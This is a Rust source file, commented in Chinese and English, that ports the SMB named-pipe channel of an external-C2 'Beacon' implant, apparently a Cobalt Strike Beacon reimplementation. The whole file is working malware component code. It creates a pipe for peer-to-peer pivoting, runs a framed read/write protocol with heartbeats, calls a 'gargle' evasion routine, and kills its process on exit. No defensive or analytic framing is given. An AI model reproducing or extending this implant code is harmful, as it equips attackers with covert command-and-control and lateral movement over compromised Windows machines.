//! client_smb_extc2.cpp 的移植版 —— 外部 C2 Beacon 变体的 SMB 数据通道。
//! Port of client_smb_extc2.cpp — SMB data channel for the external C2
//! Beacon variant.
//!
//! 与 `client_smb.rs` 相同，只是通道的读/写被替换为格式化帧处理器：
//! `link_channel_smb_extc2_read/write` 在线上携带原始的 4 字节主机字节序长度
//! （通过 jobs 的 `read_all` 读取，通过 link 的 `write_all` 写入），
//! 而不是使用配置帧头。零长度的写入以单个 0x00 心跳字节发送。
//! Identical to `client_smb.rs` except the channel's read/write are replaced
//! with pro-forma frame handlers: `link_channel_smb_extc2_read/write` carry a
//! raw 4-byte host-order length on the wire (read via `read_all` from jobs,
//! written via `write_all` from link) instead of the profile frame header.
//! A zero-length write is sent as a single 0x00 heartbeat byte.

use crate::beacon::SETTING_PIPENAME;
use crate::callback::post_error_d;
use crate::client::{client_init, client_process, client_stop, MAX_GET};
use crate::link::{lchannel_smb, write_all, LChannel};
use crate::settings::setting_ptr;
use crate::state;
use parking_lot::Mutex;
use windows_sys::Win32::Foundation::{
    CloseHandle, GetLastError, ERROR_PIPE_CONNECTED, HANDLE, INVALID_HANDLE_VALUE,
};
use windows_sys::Win32::Storage::FileSystem::{FlushFileBuffers, PIPE_ACCESS_DUPLEX};
use windows_sys::Win32::System::Pipes::{
    ConnectNamedPipe, CreateNamedPipeA, DisconnectNamedPipe, PIPE_READMODE_MESSAGE,
    PIPE_TYPE_MESSAGE, PIPE_UNLIMITED_INSTANCES,
};

/// 我们的命名管道句柄（client_smb_extc2.cpp 的 `static HANDLE pipe`）。
/// Our named pipe handle (client_smb_extc2.cpp `static HANDLE pipe`).
static PIPE: Mutex<isize> = Mutex::new(0);

/// int link_channel_smb_extc2_read(void * thisp, char * buffer, int max)
unsafe extern "C" fn link_channel_smb_extc2_read(
    thisp: *mut core::ffi::c_void,
    buffer: *mut u8,
    max: usize,
) -> i32 {
    let inst = &mut *(thisp as *mut LChannel);
    let mut get = 0i32;

    /* 把长度读入一个格式化的帧 / read our length into a pro-forma frame */
    let rlen = crate::jobs::read_all(inst.pipe, &mut get as *mut i32 as *mut u8, 4);
    if rlen == -1 || rlen != 4 {
        return -1;
    }

    /* 对我们的 get 值做健全性检查 / sanity check our get value */
    if get > max as i32 {
        return -1;
    }

    crate::jobs::read_all(inst.pipe, buffer, get as usize)
}

/// int link_channel_smb_extc2_write(void * thisp, char * buffer, int length)
unsafe extern "C" fn link_channel_smb_extc2_write(
    thisp: *mut core::ffi::c_void,
    buffer: *const u8,
    length: usize,
) -> i32 {
    let inst = &mut *(thisp as *mut LChannel);

    /* 恢复旧行为：写单个字节作为心跳，而不是推送空帧
     * restore old behavior of writing a single byte as our heartbeat, instead of pushing empty frames */
    if length == 0 {
        let empty = 0i32;
        return link_channel_smb_extc2_write(thisp, &empty as *const i32 as *const u8, 1);
    }

    /* 构建并写入我们的帧头（原始主机字节序 int，与 C++ 一致）
     * build and write our frame header (raw host-order int, as in the C++) */
    if !write_all(inst.pipe, &(length as i32).to_ne_bytes()) {
        return 0; /* 失败 / FALSE */
    }

    /* 写入整个数据包 / write the entire package */
    if write_all(inst.pipe, std::slice::from_raw_parts(buffer, length)) {
        1 /* 成功 / TRUE */
    } else {
        0 /* FALSE */
    }
}

/* 调用我们的 gargle 函数 / call our gargle function */
unsafe extern "C" fn link_channel_smb_wait(thisp: *mut core::ffi::c_void) {
    let inst = &mut *(thisp as *mut LChannel);
    crate::gargle_pivot_smb::gargle_block_pipe(inst.pipe);
}

/* 创建一种新的通道 / create a new kind of channel */
fn lchannel_smb_gargle(pipe: isize) -> LChannel {
    let mut channel = lchannel_smb(pipe);
    channel.wait = Some(link_channel_smb_wait);
    channel.read = Some(link_channel_smb_extc2_read);
    channel.write = Some(link_channel_smb_extc2_write);
    channel
}

/*
* 等待连接到我们的命名管道
* wait for a connection to our named pipe
*/
fn smb_wait() {
    let pipe = *PIPE.lock();
    if !crate::gargle_pivot_smb::gargle_pipe_wait(pipe) {
        /* 备选方案 / plan B */
        let mut f_connected = 0u32;

        /* 等待连接到我们的管道 / wait for a connection to our pipe */
        while f_connected == 0 {
            let ok = unsafe { ConnectNamedPipe(pipe as HANDLE, std::ptr::null_mut()) };
            f_connected = if ok != 0 {
                1
            } else if unsafe { GetLastError() } == ERROR_PIPE_CONNECTED {
                1
            } else {
                0
            };
        }
    }

    /* 好了，启动我们的客户端初始化例程。 / OK, kick off our client init routine. */
    client_init(lchannel_smb_gargle(pipe));
}

/*
*  初始化一个命名管道
*  init a named pipe
*/
fn smb_init() -> bool {
    /* 请设置我们的命名管道 / setup our named pipe please */
    let mut pipename = setting_ptr(SETTING_PIPENAME).unwrap_or(b"").to_vec();
    if !pipename.ends_with(&[0]) {
        pipename.push(0);
    }
    let temps = unsafe {
        CreateNamedPipeA(
            pipename.as_ptr(),
            PIPE_ACCESS_DUPLEX,
            PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE,
            PIPE_UNLIMITED_INSTANCES,
            MAX_GET as u32,
            MAX_GET as u32,
            0,
            std::ptr::null(),
        )
    };

    /* 检查错误并立即失败…… / check for errors and fail now... */
    if temps == INVALID_HANDLE_VALUE {
        post_error_d(0x17, unsafe { GetLastError() } as i32);
        return false;
    }

    /* 现在把发布类型设为 POST_SMB……因为一切似乎正常
     * set post type to POST_SMB now... since everything seems OK */
    state::set_post_type(crate::commands::POST_SMB);

    /* 现在我们可以分配句柄 / now we can assign the handle */
    *PIPE.lock() = temps as isize;
    true
}

/* 停止所有东西 / stop everything */
fn smb_stop() {
    /* 好了，关闭所有东西！ / OK, shut everything down! */
    unsafe {
        CloseHandle(*PIPE.lock() as HANDLE);
    }

    /* 最后一次清理资源 / clean up the resources with our last go */
    client_stop();
}

/*
* 把这个 beacon 置于等待连接到其管道的模式
* put this beacon into a mode where it's waiting for a connection to its pipe
*/
pub fn command_link_wait() {
    /* 设置我们的 SMB 服务器 / setup our SMB server */
    if !smb_init() {
        return;
    }

    /* 当我们是 SMB 服务器时……做这些事情
     * while we are an SMB server... do this stuff */
    while state::sleep_time() > 0 {
        /* 等待连接并发送我们的 agent id / wait for a connection and send our agent id */
        smb_wait();

        /* 处理数据 / process data */
        client_process();

        /* 关闭会话 / close the session */
        let pipe = *PIPE.lock();
        unsafe {
            FlushFileBuffers(pipe as HANDLE);
            DisconnectNamedPipe(pipe as HANDLE);
        }
    }

    /* 我们不再是 SMB 服务器……停止这些把戏
     * we're no longer an SMB server... stop the shenanigans */
    smb_stop();

    /* 直接终止进程……要么这样要么崩溃 / just kill the process... it's this or crash */
    crate::thread::safe_exit();
}
